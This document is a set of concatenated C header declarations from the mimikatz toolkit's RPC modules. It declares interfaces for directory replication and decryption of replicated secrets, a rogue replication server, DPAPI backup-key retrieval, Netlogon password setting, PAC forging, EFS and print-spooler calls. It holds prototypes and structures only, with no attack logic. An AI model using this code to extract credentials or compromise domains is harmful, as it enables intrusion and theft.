BOOL kull_m_rpc_drsr_getDomainAndUserInfos(RPC_BINDING_HANDLE *hBinding, LPCWSTR ServerName, LPCWSTR Domain, GUID *DomainGUID, LPCWSTR User, LPCWSTR Guid, GUID *UserGuid, DRS_EXTENSIONS_INT *pDrsExtensionsInt);
BOOL kull_m_rpc_drsr_getDCBind(RPC_BINDING_HANDLE *hBinding, GUID *NtdsDsaObjectGuid, DRS_HANDLE *hDrs, DRS_EXTENSIONS_INT *pDrsExtensionsInt);
BOOL kull_m_rpc_drsr_CrackName(DRS_HANDLE hDrs, DS_NAME_FORMAT NameFormat, LPCWSTR Name, DS_NAME_FORMAT FormatWanted, LPWSTR *CrackedName, LPWSTR *CrackedDomain);
BOOL kull_m_rpc_drsr_ProcessGetNCChangesReply(SCHEMA_PREFIX_TABLE *prefixTable, REPLENTINFLIST *objects);
BOOL kull_m_rpc_drsr_ProcessGetNCChangesReply_decrypt(ATTRVAL *val, SecPkgContext_SessionKey *SessionKey);
BOOL kull_m_rpc_drsr_CreateGetNCChangesReply_encrypt(ATTRVAL *val, SecPkgContext_SessionKey *SessionKey);

void kull_m_rpc_drsr_free_DRS_MSG_DCINFOREPLY_data(DWORD dcOutVersion, DRS_MSG_DCINFOREPLY * reply);
void kull_m_rpc_drsr_free_DRS_MSG_CRACKREPLY_data(DWORD nameCrackOutVersion, DRS_MSG_CRACKREPLY * reply);
void kull_m_rpc_drsr_free_DRS_MSG_GETCHGREPLY_data(DWORD dwOutVersion, DRS_MSG_GETCHGREPLY * reply);
void kull_m_rpc_drsr_free_SCHEMA_PREFIX_TABLE_data(SCHEMA_PREFIX_TABLE *prefixTable);

LPSTR kull_m_rpc_drsr_OidFromAttid(SCHEMA_PREFIX_TABLE *prefixTable, ATTRTYP type);
BOOL kull_m_rpc_drsr_MakeAttid(SCHEMA_PREFIX_TABLE *prefixTable, LPCSTR szOid, ATTRTYP *att, BOOL toAdd);

ATTRVALBLOCK * kull_m_rpc_drsr_findAttrNoOID(ATTRBLOCK *attributes, ATTRTYP type);
ATTRVALBLOCK * kull_m_rpc_drsr_findAttr(SCHEMA_PREFIX_TABLE *prefixTable, ATTRBLOCK *attributes, LPCSTR szOid);
PVOID kull_m_rpc_drsr_findMonoAttr(SCHEMA_PREFIX_TABLE *prefixTable, ATTRBLOCK *attributes, LPCSTR szOid, PVOID data, DWORD *size);
PVOID kull_m_rpc_drsr_findMonoAttrNoOID(ATTRBLOCK *attributes, ATTRTYP type, PVOID data, DWORD *size);
void kull_m_rpc_drsr_findPrintMonoAttr(LPCWSTR prefix, SCHEMA_PREFIX_TABLE *prefixTable, ATTRBLOCK *attributes, LPCSTR szOid, BOOL newLine);

LPWSTR kull_m_rpc_drsr_MakeSpnWithGUID(LPCGUID ServClass, LPCWSTR ServName, LPCGUID InstName);
NTSTATUS kull_m_rpc_drsr_start_server(LPCWSTR ServName, LPCGUID InstName);
NTSTATUS kull_m_rpc_drsr_stop_server();

// cf https://technet.microsoft.com/en-us/library/cc961740.aspx
#define SYNTAX_UNDEFINED				0x550500
#define SYNTAX_DN						0x550501
#define SYNTAX_OID						0x550502
#define SYNTAX_CASE_SENSITIVE_STRING	0x550503
#define SYNTAX_CASE_IGNORE_STRING		0x550504
#define SYNTAX_STRING_IA5				0x550505
#define SYNTAX_STRING_NUMERIC			0x550506
#define SYNTAX_OBJECT_DN_BINARY			0x550507
#define SYNTAX_BOOLEAN					0x550508
#define SYNTAX_INTEGER					0x550509
#define SYNTAX_OCTET_STRING				0x55050a
#define SYNTAX_GENERALIZED_TIME			0x55050b
#define SYNTAX_UNICODE_STRING			0x55050c
#define SYNTAX_OBJECT_PRESENTATION_ADDR	0x55050d
#define SYNTAX_OBJECT_DN				0x55050e
#define SYNTAX_NTSECURITYDESCRIPTOR		0x55050f
#define SYNTAX_LARGE_INTEGER			0x550510
#define SYNTAX_SID						0x550511

const SCHEMA_PREFIX_TABLE SCHEMA_DEFAULT_PREFIX_TABLE;

//#pragma once
//#include "kull_m_rpc.h"

typedef void *MIMI_HANDLE;

NTSTATUS SRV_MimiBind(handle_t rpc_handle, PMIMI_PUBLICKEY clientPublicKey, PMIMI_PUBLICKEY serverPublicKey, MIMI_HANDLE *phMimi);
NTSTATUS SRV_MiniUnbind(MIMI_HANDLE *phMimi);
NTSTATUS SRV_MimiCommand(MIMI_HANDLE phMimi, DWORD szEncCommand, BYTE *encCommand, DWORD *szEncResult, BYTE **encResult);
NTSTATUS SRV_MimiClear(handle_t rpc_handle, wchar_t *command, DWORD *size, wchar_t **result);

NTSTATUS CLI_MimiBind(handle_t rpc_handle, PMIMI_PUBLICKEY clientPublicKey, PMIMI_PUBLICKEY serverPublicKey, MIMI_HANDLE *phMimi);
NTSTATUS CLI_MiniUnbind(MIMI_HANDLE *phMimi);
NTSTATUS CLI_MimiCommand(MIMI_HANDLE phMimi, DWORD szEncCommand, BYTE *encCommand, DWORD *szEncResult, BYTE **encResult);
NTSTATUS CLI_MimiClear(handle_t rpc_handle, wchar_t *command, DWORD *size, wchar_t **result);

void __RPC_USER SRV_MIMI_HANDLE_rundown(MIMI_HANDLE phMimi);
extern RPC_IF_HANDLE MimiCom_v1_0_c_ifspec, MimiCom_v1_0_s_ifspec;

//#pragma once
//#include "kull_m_rpc.h"

const GUID BACKUPKEY_BACKUP_GUID, BACKUPKEY_RESTORE_GUID_WIN2K, BACKUPKEY_RETRIEVE_BACKUP_KEY_GUID, BACKUPKEY_RESTORE_GUID;

NET_API_STATUS BackuprKey(handle_t h, GUID *pguidActionAgent, byte *pDataIn, DWORD cbDataIn, byte **ppDataOut, DWORD *pcbDataOut, DWORD dwParam);

//#pragma once
//#include "kull_m_rpc.h"



size_t PCLAIMS_SET_METADATA_AlignSize(handle_t _MidlEsHandle, PCLAIMS_SET_METADATA * _pType);
void PCLAIMS_SET_METADATA_Encode(handle_t _MidlEsHandle, PCLAIMS_SET_METADATA * _pType);
void PCLAIMS_SET_METADATA_Decode(handle_t _MidlEsHandle, PCLAIMS_SET_METADATA * _pType);
void PCLAIMS_SET_METADATA_Free(handle_t _MidlEsHandle, PCLAIMS_SET_METADATA * _pType);

size_t PCLAIMS_SET_AlignSize(handle_t _MidlEsHandle, PCLAIMS_SET * _pType);
void PCLAIMS_SET_Encode(handle_t _MidlEsHandle, PCLAIMS_SET * _pType);
void PCLAIMS_SET_Decode(handle_t _MidlEsHandle, PCLAIMS_SET * _pType);
void PCLAIMS_SET_Free(handle_t _MidlEsHandle, PCLAIMS_SET * _pType);

#define kull_m_rpc_DecodeClaimsSetMetaData(data, size, pObject) kull_m_rpc_Generic_Decode(data, size, pObject, (PGENERIC_RPC_DECODE) PCLAIMS_SET_METADATA_Decode)
#define kull_m_rpc_FreeClaimsSetMetaData(pObject) kull_m_rpc_Generic_Free(pObject, (PGENERIC_RPC_FREE) PCLAIMS_SET_METADATA_Free)
#define kull_m_rpc_EncodeClaimsSetMetaData(pObject, data, size) kull_m_rpc_Generic_Encode(pObject, data, size, (PGENERIC_RPC_ENCODE) PCLAIMS_SET_METADATA_Encode, (PGENERIC_RPC_ALIGNSIZE) PCLAIMS_SET_METADATA_AlignSize)

#define kull_m_rpc_DecodeClaimsSet(data, size, pObject) kull_m_rpc_Generic_Decode(data, size, pObject, (PGENERIC_RPC_DECODE) PCLAIMS_SET_Decode)
#define kull_m_rpc_FreeClaimsSet(pObject) kull_m_rpc_Generic_Free(pObject, (PGENERIC_RPC_FREE) PCLAIMS_SET_Free)
#define kull_m_rpc_EncodeClaimsSet(pObject, data, size) kull_m_rpc_Generic_Encode(pObject, data, size, (PGENERIC_RPC_ENCODE) PCLAIMS_SET_Encode, (PGENERIC_RPC_ALIGNSIZE) PCLAIMS_SET_AlignSize)

//#pragma once
//#include "kull_m_rpc.h"

typedef enum _KIWI_CREDENTIAL_KEY_TYPE {
	CREDENTIALS_KEY_TYPE_NTLM = 1,
	CREDENTIALS_KEY_TYPE_SHA1 = 2,
	CREDENTIALS_KEY_TYPE_ROOTKEY = 3,
	CREDENTIALS_KEY_TYPE_DPAPI_PROTECTION = 4,
} KIWI_CREDENTIAL_KEY_TYPE;

typedef struct _KIWI_CREDENTIAL_KEY {
	DWORD unkEnum; // version ?
	KIWI_CREDENTIAL_KEY_TYPE type;
	WORD iterations;
	WORD cbData;
	BYTE *pbData;
} KIWI_CREDENTIAL_KEY, *PKIWI_CREDENTIAL_KEY;

typedef struct _KIWI_CREDENTIAL_KEYS {
	DWORD count;
	KIWI_CREDENTIAL_KEY keys[ANYSIZE_ARRAY];
} KIWI_CREDENTIAL_KEYS, *PKIWI_CREDENTIAL_KEYS;

void CredentialKeys_Decode(handle_t _MidlEsHandle, PKIWI_CREDENTIAL_KEYS * _pType);
void CredentialKeys_Free(handle_t _MidlEsHandle, PKIWI_CREDENTIAL_KEYS * _pType);

#define kull_m_rpc_DecodeCredentialKeys(/*PVOID */data, /*DWORD */size, /*PKIWI_CREDENTIAL_KEYS **/pObject) kull_m_rpc_Generic_Decode(data, size, pObject, (PGENERIC_RPC_DECODE) CredentialKeys_Decode)
#define kull_m_rpc_FreeCredentialKeys(/*PKIWI_CREDENTIAL_KEYS **/pObject) kull_m_rpc_Generic_Free(pObject, (PGENERIC_RPC_FREE) CredentialKeys_Free)

#define LSA_CREDENTIAL_KEY_PACKAGE_NAME			L"LSACREDKEY"
//#define LSA_CREDENTIAL_KEY_PACKAGE_ID			0x10000				// pseudo package id. must not collide with any other package id	 	
//#define LSA_CREDENTIAL_KEY_NAME					"CredentialKeys" 	
//#define LSA_CREDENTIAL_KEY_ROOT_KEY_ITERATIONS	(1024 * 10)			// in parity with cache logon verifier	 	
//
//typedef enum _LSA_CREDENTIAL_KEY_SOURCE_TYPE {
//	eFromPrecomputed = 1,	// used by Kerberos
//	eFromClearPassword,
//	eFromNtOwf,
//} LSA_CREDENTIAL_KEY_SOURCE_TYPE, *PLSA_CREDENTIAL_KEY_SOURCE_TYPE;
//
//typedef enum _LSA_CREDENTIAL_KEY_TYPE {
//	eDPAPINtOwf = 1,	// legacy NTOWF used by DPAPI
//	eDPAPISha1,			// legacy SHA1 used by DPAPI
//	eRootKey,			// PBKDF2(NTOWF), uplevel root key
//	eDPAPIProtection,	// uplevel DPAPI protection key, derived from root key
//} LSA_CREDENTIAL_KEY_TYPE, *PLSA_CREDENTIAL_KEY_TYPE;
//
//typedef struct _LSA_CREDENTIAL_KEY {
//	LSA_CREDENTIAL_KEY_SOURCE_TYPE SourceType;
//	LSA_CREDENTIAL_KEY_TYPE KeyType;
//	USHORT Iterations;
//	USHORT KeySize;
//#ifdef MIDL_PASS
//	[size_is(KeySize)]
//#endif // MIDL_PASS	 	
//	PUCHAR KeyBuffer;
//} LSA_CREDENTIAL_KEY, *PLSA_CREDENTIAL_KEY;
//
//typedef struct _LSA_CREDENTIAL_KEY_ARRAY {
//	USHORT KeyCount;
//#ifdef MIDL_PASS
//	[size_is(KeyCount)] LSA_CREDENTIAL_KEY Keys[*];
//#else  // MIDL_PASS
//	LSA_CREDENTIAL_KEY Keys[ANYSIZE_ARRAY];
//#endif // MIDL_PASS
//} LSA_CREDENTIAL_KEY_ARRAY, *PLSA_CREDENTIAL_KEY_ARRAY;
//
////
//// convenience helper
////
//typedef struct _LSA_CREDENTIAL_KEY_ARRAY_STORAGE {
//	USHORT KeyCount;
//	LSA_CREDENTIAL_KEY Keys[8];
//} LSA_CREDENTIAL_KEY_ARRAY_STORAGE, *PLSA_CREDENTIAL_KEY_ARRAY_STORAGE;

//#pragma once
//#include "kull_m_rpc.h"

typedef struct tagCOMVERSION {
	USHORT MajorVersion;
	USHORT MinorVersion;
} COMVERSION;

typedef struct tagDUALSTRINGARRAY {
	USHORT wNumEntries;
	USHORT wSecurityOffset;
	USHORT aStringArray[ANYSIZE_ARRAY];
} DUALSTRINGARRAY;

error_status_t ServerAlive2(handle_t hRpc, COMVERSION *pComVersion, DUALSTRINGARRAY **ppdsaOrBindings, DWORD *pReserved);

//#pragma once
//#include "kull_m_rpc.h"








typedef struct _UPTODATE_CURSOR_V1 {
	UUID uuidDsa;
	USN usnHighPropUpdate;
} UPTODATE_CURSOR_V1;

typedef struct _UPTODATE_VECTOR_V1_EXT {
	DWORD dwVersion;
	DWORD dwReserved1;
	DWORD cNumCursors;
	DWORD dwReserved2;
	UPTODATE_CURSOR_V1 rgCursors[ANYSIZE_ARRAY];
} UPTODATE_VECTOR_V1_EXT;












typedef struct _REPLTIMES {
	UCHAR rgTimes[84];
} REPLTIMES;




typedef struct _ENTINFLIST {
	struct _ENTINFLIST *pNextEntInf;
	ENTINF Entinf;
} ENTINFLIST;

typedef struct _DRS_EXTENSIONS {
	DWORD cb;
	BYTE rgb[ANYSIZE_ARRAY];
} DRS_EXTENSIONS;



typedef struct _DRS_MSG_GETCHGREQ_V8 {
	UUID uuidDsaObjDest;
	UUID uuidInvocIdSrc;
	DSNAME *pNC;
	USN_VECTOR usnvecFrom;
	UPTODATE_VECTOR_V1_EXT *pUpToDateVecDest;
	ULONG ulFlags;
	ULONG cMaxObjects;
	ULONG cMaxBytes;
	ULONG ulExtendedOp;
	ULARGE_INTEGER liFsmoInfo;
	PARTIAL_ATTR_VECTOR_V1_EXT *pPartialAttrSet;
	PARTIAL_ATTR_VECTOR_V1_EXT *pPartialAttrSetEx;
	SCHEMA_PREFIX_TABLE PrefixTableDest;
} DRS_MSG_GETCHGREQ_V8;

typedef union _DRS_MSG_GETCHGREQ {
	DRS_MSG_GETCHGREQ_V8 V8;
} DRS_MSG_GETCHGREQ;

typedef struct _DRS_MSG_UPDREFS_V1 {
	DSNAME *pNC;
	UCHAR *pszDsaDest;
	UUID uuidDsaObjDest;
	ULONG ulOptions;
} DRS_MSG_UPDREFS_V1;

typedef union _DRS_MSG_UPDREFS {
	DRS_MSG_UPDREFS_V1 V1;
} 	DRS_MSG_UPDREFS;

typedef struct _DRS_MSG_REPADD_V1 {
	DSNAME *pNC;
	UCHAR *pszDsaSrc;
	REPLTIMES rtSchedule;
	ULONG ulOptions;
} DRS_MSG_REPADD_V1;

typedef union _DRS_MSG_REPADD {
	DRS_MSG_REPADD_V1 V1;
} DRS_MSG_REPADD;

typedef struct _DRS_MSG_REPDEL_V1 {
	DSNAME *pNC;
	UCHAR *pszDsaSrc;
	ULONG ulOptions;
} DRS_MSG_REPDEL_V1;

typedef union _DRS_MSG_REPDEL {
	DRS_MSG_REPDEL_V1 V1;
} DRS_MSG_REPDEL;

typedef struct _DRS_MSG_VERIFYREQ_V1 {
	DWORD dwFlags;
	DWORD cNames;
	DSNAME **rpNames;
	ATTRBLOCK RequiredAttrs;
	SCHEMA_PREFIX_TABLE PrefixTable;
} DRS_MSG_VERIFYREQ_V1;

typedef union _DRS_MSG_VERIFYREQ {
	DRS_MSG_VERIFYREQ_V1 V1;
} DRS_MSG_VERIFYREQ;

typedef struct _DRS_MSG_VERIFYREPLY_V1 {
	DWORD error;
	DWORD cNames;
	ENTINF *rpEntInf;
	SCHEMA_PREFIX_TABLE PrefixTable;
} DRS_MSG_VERIFYREPLY_V1;

typedef union _DRS_MSG_VERIFYREPLY {
	DRS_MSG_VERIFYREPLY_V1 V1;
} DRS_MSG_VERIFYREPLY;

typedef struct _DRS_MSG_CRACKREQ_V1 {
	ULONG CodePage;
	ULONG LocaleId;
	DWORD dwFlags;
	DWORD formatOffered;
	DWORD formatDesired;
	DWORD cNames;
	WCHAR **rpNames;
} DRS_MSG_CRACKREQ_V1;

typedef union _DRS_MSG_CRACKREQ {
	DRS_MSG_CRACKREQ_V1 V1;
} DRS_MSG_CRACKREQ;



typedef struct _DRS_MSG_DCINFOREQ_V1 {
	WCHAR *Domain;
	DWORD InfoLevel;
} DRS_MSG_DCINFOREQ_V1;

typedef union _DRS_MSG_DCINFOREQ {
	DRS_MSG_DCINFOREQ_V1 V1;
} DRS_MSG_DCINFOREQ, *PDRS_MSG_DCINFOREQ;



typedef struct _DRS_MSG_ADDENTRYREQ_V2 {
	ENTINFLIST EntInfList;
} DRS_MSG_ADDENTRYREQ_V2;

typedef union _DRS_MSG_ADDENTRYREQ {
	DRS_MSG_ADDENTRYREQ_V2 V2;
} DRS_MSG_ADDENTRYREQ;

typedef struct _ADDENTRY_REPLY_INFO {
	GUID objGuid;
	NT4SID objSid;
} ADDENTRY_REPLY_INFO;

typedef struct _DRS_MSG_ADDENTRYREPLY_V2 {
	DSNAME *pErrorObject;
	DWORD errCode;
	DWORD dsid;
	DWORD extendedErr;
	DWORD extendedData;
	USHORT problem;
	ULONG cObjectsAdded;
	ADDENTRY_REPLY_INFO *infoList;
} DRS_MSG_ADDENTRYREPLY_V2;

typedef union _DRS_MSG_ADDENTRYREPLY {
	DRS_MSG_ADDENTRYREPLY_V2 V2;
} DRS_MSG_ADDENTRYREPLY;

extern RPC_IF_HANDLE drsuapi_v4_0_c_ifspec;
extern RPC_IF_HANDLE drsuapi_v4_0_s_ifspec;

ULONG IDL_DRSBind(handle_t rpc_handle, UUID *puuidClientDsa, DRS_EXTENSIONS *pextClient, DRS_EXTENSIONS **ppextServer, DRS_HANDLE *phDrs);
ULONG IDL_DRSUnbind(DRS_HANDLE *phDrs);
ULONG IDL_DRSReplicaAdd(DRS_HANDLE hDrs, DWORD dwVersion, DRS_MSG_REPADD *pmsgAdd);
ULONG IDL_DRSReplicaDel(DRS_HANDLE hDrs, DWORD dwVersion, DRS_MSG_REPDEL *pmsgDel);
ULONG IDL_DRSGetNCChanges(DRS_HANDLE hDrs, DWORD dwInVersion, DRS_MSG_GETCHGREQ *pmsgIn, DWORD *pdwOutVersion, DRS_MSG_GETCHGREPLY *pmsgOut);
ULONG IDL_DRSCrackNames(DRS_HANDLE hDrs, DWORD dwInVersion, DRS_MSG_CRACKREQ *pmsgIn, DWORD *pdwOutVersion, DRS_MSG_CRACKREPLY *pmsgOut);
ULONG IDL_DRSDomainControllerInfo(DRS_HANDLE hDrs, DWORD dwInVersion, DRS_MSG_DCINFOREQ *pmsgIn, DWORD *pdwOutVersion, DRS_MSG_DCINFOREPLY *pmsgOut);
ULONG IDL_DRSAddEntry(DRS_HANDLE hDrs, DWORD dwInVersion, DRS_MSG_ADDENTRYREQ *pmsgIn, DWORD *pdwOutVersion, DRS_MSG_ADDENTRYREPLY *pmsgOut);

void DRS_MSG_GETCHGREPLY_V6_Free(handle_t _MidlEsHandle, DRS_MSG_GETCHGREPLY_V6 * _pType);
void DRS_MSG_CRACKREPLY_V1_Free(handle_t _MidlEsHandle, DRS_MSG_CRACKREPLY_V1 * _pType);
void DRS_MSG_DCINFOREPLY_V2_Free(handle_t _MidlEsHandle, DRS_MSG_DCINFOREPLY_V2 * _pType);
void DRS_MSG_ADDENTRYREPLY_V2_Free(handle_t _MidlEsHandle, DRS_MSG_ADDENTRYREPLY_V2 * _pType);

#define kull_m_rpc_ms_drsr_FreeDRS_MSG_GETCHGREPLY_V6(pObject) kull_m_rpc_Generic_Free(pObject, (PGENERIC_RPC_FREE) DRS_MSG_GETCHGREPLY_V6_Free)
#define kull_m_rpc_ms_drsr_FreeDRS_MSG_CRACKREPLY_V1(pObject) kull_m_rpc_Generic_Free(pObject, (PGENERIC_RPC_FREE) DRS_MSG_CRACKREPLY_V1_Free)
#define kull_m_rpc_ms_drsr_FreeDRS_MSG_DCINFOREPLY_V2(pObject) kull_m_rpc_Generic_Free(pObject, (PGENERIC_RPC_FREE) DRS_MSG_DCINFOREPLY_V2_Free)
#define kull_m_rpc_ms_drsr_FreeDRS_MSG_ADDENTRYREPLY_V2(pObject) kull_m_rpc_Generic_Free(pObject, (PGENERIC_RPC_FREE) DRS_MSG_ADDENTRYREPLY_V2_Free)

void __RPC_USER SRV_DRS_HANDLE_rundown(DRS_HANDLE hDrs);
ULONG SRV_IDL_DRSBind(handle_t rpc_handle, UUID *puuidClientDsa, DRS_EXTENSIONS *pextClient, DRS_EXTENSIONS **ppextServer, DRS_HANDLE *phDrs);
ULONG SRV_IDL_DRSUnbind(DRS_HANDLE *phDrs);
ULONG SRV_IDL_DRSGetNCChanges(DRS_HANDLE hDrs, DWORD dwInVersion, DRS_MSG_GETCHGREQ *pmsgIn, DWORD *pdwOutVersion, DRS_MSG_GETCHGREPLY *pmsgOut);
ULONG SRV_IDL_DRSVerifyNames(DRS_HANDLE hDrs, DWORD dwInVersion, DRS_MSG_VERIFYREQ *pmsgIn, DWORD *pdwOutVersion, DRS_MSG_VERIFYREPLY *pmsgOut);
ULONG SRV_IDL_DRSUpdateRefs(DRS_HANDLE hDrs, DWORD dwVersion, DRS_MSG_UPDREFS *pmsgUpdRefs);

void SRV_OpnumNotImplemented(handle_t IDL_handle);
ULONG SRV_IDL_DRSReplicaAddNotImplemented(DRS_HANDLE hDrs, DWORD dwVersion, DRS_MSG_REPADD *pmsgAdd);
ULONG SRV_IDL_DRSReplicaDelNotImplemented(DRS_HANDLE hDrs, DWORD dwVersion, DRS_MSG_REPDEL *pmsgDel);
ULONG SRV_IDL_DRSCrackNamesNotImplemented(DRS_HANDLE hDrs, DWORD dwInVersion, DRS_MSG_CRACKREQ *pmsgIn, DWORD *pdwOutVersion, DRS_MSG_CRACKREPLY *pmsgOut);
ULONG SRV_IDL_DRSDomainControllerInfoNotImplemented(DRS_HANDLE hDrs, DWORD dwInVersion, DRS_MSG_DCINFOREQ *pmsgIn, DWORD *pdwOutVersion, DRS_MSG_DCINFOREPLY *pmsgOut);
ULONG SRV_IDL_DRSAddEntryNotImplemented(DRS_HANDLE hDrs, DWORD dwInVersion, DRS_MSG_ADDENTRYREQ *pmsgIn, DWORD *pdwOutVersion, DRS_MSG_ADDENTRYREPLY *pmsgOut);

/*	Benjamin DELPY `gentilkiwi`
	https://blog.gentilkiwi.com
	benjamin@gentilkiwi.com
	Licence : https://creativecommons.org/licenses/by/4.0/
*/
//#pragma once
//#include "kull_m_rpc.h"

extern const UUID EFSR_ObjectUUID;

typedef void *PEXIMPORT_CONTEXT_HANDLE;

typedef struct pipe_EFS_EXIM_PIPE {
	void (__RPC_USER* pull) (CHAR* state, UCHAR* buf, ULONG esize, ULONG* ecount);
	void (__RPC_USER* push) (CHAR* state, UCHAR* buf, ULONG ecount);
	void (__RPC_USER* alloc) (CHAR* state, ULONG bsize, UCHAR** buf, ULONG* bcount);
	char* state;
} EFS_EXIM_PIPE;

long EfsRpcOpenFileRaw(handle_t binding_h, PEXIMPORT_CONTEXT_HANDLE* hContext, wchar_t* FileName, long Flags);
long EfsRpcReadFileRaw(PEXIMPORT_CONTEXT_HANDLE hContext, EFS_EXIM_PIPE* EfsOutPipe);
long EfsRpcWriteFileRaw(PEXIMPORT_CONTEXT_HANDLE hContext, EFS_EXIM_PIPE* EfsInPipe);
void EfsRpcCloseRaw(PEXIMPORT_CONTEXT_HANDLE* hContext);
long EfsRpcEncryptFileSrv(handle_t binding_h, wchar_t* FileName);
long EfsRpcDecryptFileSrv(handle_t binding_h, wchar_t* FileName, unsigned long OpenFlag);

RPC_IF_HANDLE efsrpc_v1_0_c_ifspec;

//#pragma once
//#include "kull_m_rpc.h"
//#include "../kull_m_samlib.h"






NTSTATUS NetrServerReqChallenge(IN LOGONSRV_HANDLE PrimaryName, IN wchar_t *ComputerName, IN PNETLOGON_CREDENTIAL ClientChallenge, OUT PNETLOGON_CREDENTIAL ServerChallenge);
NTSTATUS NetrServerAuthenticate2(IN LOGONSRV_HANDLE PrimaryName, IN wchar_t *AccountName, IN NETLOGON_SECURE_CHANNEL_TYPE SecureChannelType, IN wchar_t *ComputerName, IN PNETLOGON_CREDENTIAL ClientCredential, OUT PNETLOGON_CREDENTIAL ServerCredential, IN OUT ULONG *NegotiateFlags);
NTSTATUS NetrServerPasswordSet2(IN LOGONSRV_HANDLE PrimaryName, IN wchar_t *AccountName, IN NETLOGON_SECURE_CHANNEL_TYPE SecureChannelType, IN wchar_t *ComputerName, IN PNETLOGON_AUTHENTICATOR Authenticator, OUT PNETLOGON_AUTHENTICATOR ReturnAuthenticator, IN PNL_TRUST_PASSWORD ClearNewPassword);
NTSTATUS NetrServerTrustPasswordsGet(IN LOGONSRV_HANDLE TrustedDcName, IN wchar_t *AccountName, IN NETLOGON_SECURE_CHANNEL_TYPE SecureChannelType, IN wchar_t *ComputerName, IN PNETLOGON_AUTHENTICATOR Authenticator, OUT PNETLOGON_AUTHENTICATOR ReturnAuthenticator, OUT PENCRYPTED_NT_OWF_PASSWORD EncryptedNewOwfPassword, OUT PENCRYPTED_NT_OWF_PASSWORD EncryptedOldOwfPassword);

extern handle_t hLogon;
extern RPC_IF_HANDLE logon_v1_0_c_ifspec;

handle_t __RPC_USER LOGONSRV_HANDLE_bind(IN LOGONSRV_HANDLE Name);
void __RPC_USER LOGONSRV_HANDLE_unbind(IN LOGONSRV_HANDLE Name, handle_t hLogon);

//#pragma once
//#include "kull_m_rpc.h"
//#include "../kull_m_samlib.h"




void PPAC_CREDENTIAL_DATA_Decode(handle_t _MidlEsHandle, PPAC_CREDENTIAL_DATA * _pType);
void PPAC_CREDENTIAL_DATA_Free(handle_t _MidlEsHandle, PPAC_CREDENTIAL_DATA * _pType);

size_t PKERB_VALIDATION_INFO_AlignSize(handle_t _MidlEsHandle, PKERB_VALIDATION_INFO * _pType);
void PKERB_VALIDATION_INFO_Encode(handle_t _MidlEsHandle, PKERB_VALIDATION_INFO * _pType);
void PKERB_VALIDATION_INFO_Decode(handle_t _MidlEsHandle, PKERB_VALIDATION_INFO * _pType);
void PKERB_VALIDATION_INFO_Free(handle_t _MidlEsHandle, PKERB_VALIDATION_INFO * _pType);

#define kull_m_pac_DecodeCredential(/*PVOID */data, /*DWORD */size, /*PPAC_CREDENTIAL_DATA **/pObject) kull_m_rpc_Generic_Decode(data, size, pObject, (PGENERIC_RPC_DECODE) PPAC_CREDENTIAL_DATA_Decode)
#define kull_m_pac_FreeCredential(/*PPAC_CREDENTIAL_DATA **/pObject) kull_m_rpc_Generic_Free(pObject, (PGENERIC_RPC_FREE) PPAC_CREDENTIAL_DATA_Free)

#define kull_m_pac_DecodeValidationInformation(/*PVOID */data, /*DWORD */size, /*PKERB_VALIDATION_INFO **/pObject) kull_m_rpc_Generic_Decode(data, size, pObject, (PGENERIC_RPC_DECODE) PKERB_VALIDATION_INFO_Decode)
#define kull_m_pac_FreeValidationInformation(/*PKERB_VALIDATION_INFO **/pObject) kull_m_rpc_Generic_Free(pObject, (PGENERIC_RPC_FREE) PKERB_VALIDATION_INFO_Free)
#define kull_m_pac_EncodeValidationInformation(/*PKERB_VALIDATION_INFO **/pObject, /*PVOID **/data, /*DWORD **/size) kull_m_rpc_Generic_Encode(pObject, data, size, (PGENERIC_RPC_ENCODE) PKERB_VALIDATION_INFO_Encode, (PGENERIC_RPC_ALIGNSIZE) PKERB_VALIDATION_INFO_AlignSize)

//#pragma once
//#include "kull_m_rpc.h"
//#include "kull_m_rpc_ms-rprn.h"

const UUID PAR_ObjectUUID;

typedef struct _SPLCLIENT_INFO_1 {
	DWORD dwSize;
	DWORD dwBuildNum;
	DWORD dwMajorVersion;
	DWORD dwMinorVersion;
	unsigned short wProcessorArchitecture;
} SPLCLIENT_INFO_1;

typedef struct _SPLCLIENT_INFO_2 {
	LONG_PTR notUsed;
} SPLCLIENT_INFO_2;

typedef struct _SPLCLIENT_INFO_3 {
	unsigned int cbSize;
	DWORD dwFlags;
	DWORD dwSize;
	wchar_t *pMachineName;
	wchar_t *pUserName;
	DWORD dwBuildNum;
	DWORD dwMajorVersion;
	DWORD dwMinorVersion;
	unsigned short wProcessorArchitecture;
	unsigned __int64 hSplPrinter;
} SPLCLIENT_INFO_3;

typedef struct _SPLCLIENT_CONTAINER {
	DWORD Level;
	union  {
		SPLCLIENT_INFO_1 *pClientInfo1;
		SPLCLIENT_INFO_2 *pNotUsed;
		SPLCLIENT_INFO_3 *pClientInfo3;
	} 	ClientInfo;
} SPLCLIENT_CONTAINER;

DWORD RpcAsyncOpenPrinter(handle_t hRemoteBinding, wchar_t *pPrinterName, PRINTER_HANDLE *pHandle, wchar_t *pDatatype, DEVMODE_CONTAINER *pDevModeContainer, DWORD AccessRequired, SPLCLIENT_CONTAINER *pClientInfo);
DWORD RpcAsyncClosePrinter(PRINTER_HANDLE *phPrinter);
DWORD RpcAsyncAddPrinterDriver(handle_t hRemoteBinding, wchar_t *pName, DRIVER_CONTAINER *pDriverContainer, DWORD dwFileCopyFlags);
DWORD RpcAsyncEnumPrinterDrivers(handle_t hRemoteBinding, wchar_t *pName, wchar_t *pEnvironment, DWORD Level, unsigned char *pDrivers, DWORD cbBuf, DWORD *pcbNeeded, DWORD *pcReturned);
DWORD RpcAsyncGetPrinterDriverDirectory(handle_t hRemoteBinding, wchar_t *pName, wchar_t *pEnvironment, DWORD Level, unsigned char *pDriverDirectory, DWORD cbBuf, DWORD *pcbNeeded);
DWORD RpcAsyncDeletePrinterDriverEx(handle_t hRemoteBinding, wchar_t *pName, wchar_t *pEnvironment, wchar_t *pDriverName, DWORD dwDeleteFlag, DWORD dwVersionNum);

//#pragma once
//#include "kull_m_rpc.h"
/*
#define PRINTER_CHANGE_ADD_JOB	0x00000100
#define PRINTER_CHANGE_ALL		0x7777FFFF
*/






DWORD RpcOpenPrinter(STRING_HANDLE pPrinterName, PRINTER_HANDLE *pHandle,wchar_t *pDatatype, DEVMODE_CONTAINER *pDevModeContainer, DWORD AccessRequired);
DWORD RpcEnumPrinterDrivers(STRING_HANDLE pName,wchar_t *pEnvironment, DWORD Level, BYTE *pDrivers, DWORD cbBuf, DWORD *pcbNeeded, DWORD *pcReturned);
